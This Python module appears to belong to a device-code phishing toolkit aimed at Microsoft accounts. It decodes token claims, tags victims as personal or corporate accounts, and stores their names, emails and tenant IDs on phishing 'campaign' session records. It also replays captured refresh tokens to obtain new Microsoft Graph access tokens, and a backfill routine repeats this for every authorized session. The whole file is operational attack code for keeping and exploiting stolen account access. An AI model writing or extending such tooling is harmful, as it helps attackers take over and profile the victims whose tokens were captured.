"""Extract and persist user identity from Microsoft OAuth token claims."""
import base64
import json


def decode_jwt_payload(token_str: str) -> dict:
    if not token_str:
        return {}
    parts = token_str.split(".")
    if len(parts) < 2:
        return {}
    payload = parts[1]
    padding = "=" * ((4 - len(payload) % 4) % 4)
    try:
        return json.loads(base64.urlsafe_b64decode((payload + padding).encode("utf-8")))
    except (ValueError, json.JSONDecodeError):
        return {}


def _empty_identity() -> dict:
    return {
        "user_email": "",
        "user_display_name": "",
        "user_given_name": "",
        "user_family_name": "",
        "user_id": "",
        "tenant_id": "",
        "account_type": "",
        "identity_provider": "",
    }


def _email_from_unique_name(unique_name: str) -> str:
    """MSA tokens may use unique_name like live.com#user@gmail.com."""
    value = (unique_name or "").strip()
    if not value:
        return ""
    if "#" in value and "@" in value:
        return value.split("#", 1)[1].strip()
    return value if "@" in value else ""


def classify_account_type(claims: dict) -> tuple:
    """
    Personal Microsoft accounts expose idp=live.com in Graph access token JWT.
    Work/school (corporate) tokens typically do not.
    """
    idp = (claims.get("idp") or "").strip().lower()
    altsecid = str(claims.get("altsecid") or "").lower()
    if idp == "live.com" or "live.com" in altsecid:
        return "personal", idp or "live.com"
    if idp:
        return "corporate", idp
    if claims.get("oid") or claims.get("idtyp") == "user":
        return "corporate", ""
    return "", idp


def extract_user_claims(claims: dict) -> dict:
    """Normalize Microsoft id/access token JWT claims into stored user fields."""
    if not claims:
        return _empty_identity()

    email = (
        claims.get("email")
        or claims.get("preferred_username")
        or claims.get("upn")
        or _email_from_unique_name(claims.get("unique_name") or "")
        or ""
    )
    if email and "@" not in str(email):
        email = ""

    given = (claims.get("given_name") or "").strip()
    family = (claims.get("family_name") or "").strip()
    name = (claims.get("name") or claims.get("display_name") or "").strip()
    if not name:
        if given and family and given.lower() == family.lower():
            name = given
        else:
            name = f"{given} {family}".strip()
    if not name and given:
        name = given

    user_id = claims.get("oid") or claims.get("sub") or ""
    tenant_id = claims.get("tid") or claims.get("tenant_id") or ""
    account_type, identity_provider = classify_account_type(claims)

    return {
        "user_email": email or "",
        "user_display_name": name or "",
        "user_given_name": given or "",
        "user_family_name": family or "",
        "user_id": user_id or "",
        "tenant_id": tenant_id or "",
        "account_type": account_type or "",
        "identity_provider": identity_provider or "",
    }


def identity_from_graph_access_token(access_token: str) -> dict:
    """Decode a Microsoft Graph access token JWT (aud=graph.microsoft.com)."""
    claims = decode_jwt_payload(access_token)
    if not claims:
        return _empty_identity()
    aud = str(claims.get("aud") or "")
    if "graph.microsoft.com" not in aud:
        return _empty_identity()
    return extract_user_claims(claims)


def jwt_scope_claims(access_token: str) -> dict:
    """Extract OAuth scope claims from a Microsoft access token JWT."""
    claims = decode_jwt_payload(access_token)
    if not claims:
        return {"scp": "", "scopes": [], "roles": [], "aud": "", "exp": None}

    scp_raw = claims.get("scp", "")
    if isinstance(scp_raw, list):
        scopes = [str(s).strip() for s in scp_raw if str(s).strip()]
        scp_str = " ".join(scopes)
    else:
        scp_str = str(scp_raw or "").strip()
        scopes = [s for s in scp_str.split() if s]

    roles_raw = claims.get("roles") or []
    if isinstance(roles_raw, str):
        roles = [r for r in roles_raw.split() if r]
    elif isinstance(roles_raw, list):
        roles = [str(r).strip() for r in roles_raw if str(r).strip()]
    else:
        roles = []

    return {
        "scp": scp_str,
        "scopes": scopes,
        "roles": roles,
        "aud": claims.get("aud") or "",
        "exp": claims.get("exp"),
    }


def _merge_identity(base: dict, extra: dict) -> dict:
    out = dict(base or _empty_identity())
    for key, value in (extra or {}).items():
        if value and not out.get(key):
            out[key] = value
    return out


def enrich_identity_from_refresh_token(
    tenant_id: str, refresh_token: str, info: dict, client_id: str = None
) -> dict:
    """
    Refresh a Graph token and decode its JWT payload.
    Personal MSA accounts expose given_name/family_name/email and idp=live.com here.
    """
    info = dict(info or _empty_identity())
    if not refresh_token:
        return info

    from app.device_code import refresh_access_token

    graph_scope = "https://graph.microsoft.com/User.Read offline_access openid profile email"
    try:
        graph_tok = refresh_access_token(
            tenant_id, refresh_token, scope=graph_scope, client_id=client_id
        )
        access = graph_tok.get("access_token")
        if access:
            graph_info = identity_from_graph_access_token(access)
            if graph_info.get("account_type") == "personal":
                # Graph JWT is authoritative for personal Microsoft accounts.
                return _merge_identity(info, graph_info)
            info = _merge_identity(info, graph_info)
            if info.get("user_display_name"):
                return info
    except Exception:
        pass

    if info.get("user_display_name"):
        return info

    try:
        profile_tok = refresh_access_token(
            tenant_id,
            refresh_token,
            scope="openid profile email offline_access",
            client_id=client_id,
        )
        profile_info = merge_claims_from_token_response(profile_tok)
        return _merge_identity(info, profile_info)
    except Exception:
        return info


def merge_claims_from_token_response(data: dict) -> dict:
    """Prefer id_token claims; fall back to access_token payload."""
    claims = decode_jwt_payload(data.get("id_token") or "")
    if not claims:
        claims = decode_jwt_payload(data.get("access_token") or "")
    return extract_user_claims(claims)


def resolve_identity_from_token_response(
    data: dict, tenant_id: str = "organizations", client_id: str = None
) -> dict:
    """Resolve user identity from token response, with Graph JWT decode for personal accounts."""
    info = merge_claims_from_token_response(data)
    if data.get("refresh_token"):
        info = enrich_identity_from_refresh_token(
            tenant_id, data["refresh_token"], info, client_id=client_id
        )
    return info


def apply_auth_identity(session, token, info: dict) -> None:
    """Persist victim identity on session and captured token after successful auth."""
    if not info:
        return

    field_map = (
        ("user_id", "user_id"),
        ("user_email", "user_email"),
        ("user_display_name", "user_display_name"),
        ("user_given_name", "user_given_name"),
        ("user_family_name", "user_family_name"),
        ("tenant_id", "tenant_id"),
        ("account_type", "account_type"),
        ("identity_provider", "identity_provider"),
    )
    for session_key, info_key in field_map:
        value = info.get(info_key)
        if value:
            setattr(session, session_key, value)
            setattr(token, session_key, value)

    if not session.target_email:
        session.target_email = (
            info.get("user_email")
            or info.get("user_display_name")
            or info.get("user_id")
        )


def backfill_session_identity(db):
    """Populate session identity fields from captured tokens / Graph JWT payloads."""
    from app.models import DeviceCodeSession
    from app.services import get_effective_device_code_config

    sessions = DeviceCodeSession.query.filter_by(status="authorized").all()
    updated = False
    for session in sessions:
        token = session.captured_token
        if not token:
            continue

        try:
            campaign = session.campaign
            tenant_id, client_id = get_effective_device_code_config(campaign)
        except Exception:
            tenant_id, client_id = "organizations", None

        info = _empty_identity()
        info.update({
            "user_email": token.user_email or session.user_email or "",
            "user_display_name": token.user_display_name or session.user_display_name or "",
            "user_given_name": getattr(token, "user_given_name", None) or getattr(session, "user_given_name", None) or "",
            "user_family_name": getattr(token, "user_family_name", None) or getattr(session, "user_family_name", None) or "",
            "user_id": token.user_id or session.user_id or "",
            "tenant_id": token.tenant_id or session.tenant_id or "",
            "account_type": getattr(token, "account_type", None) or getattr(session, "account_type", None) or "",
            "identity_provider": getattr(token, "identity_provider", None) or getattr(session, "identity_provider", None) or "",
        })

        if token.access_token:
            graph_info = identity_from_graph_access_token(token.access_token)
            if any(graph_info.values()):
                info = _merge_identity(info, graph_info)

        if token.refresh_token and (
            not info.get("user_display_name")
            or not info.get("account_type")
            or info.get("account_type") == "personal" and not info.get("user_given_name")
        ):
            info = enrich_identity_from_refresh_token(
                tenant_id, token.refresh_token, info, client_id=client_id
            )

        if not any(info.values()):
            continue

        snapshot_keys = (
            "user_email", "user_display_name", "user_given_name", "user_family_name",
            "user_id", "tenant_id", "account_type", "identity_provider",
        )
        before = tuple(getattr(session, k, None) for k in snapshot_keys)
        apply_auth_identity(session, token, info)
        after = tuple(getattr(session, k, None) for k in snapshot_keys)
        if before != after:
            updated = True

    if updated:
        db.session.commit()
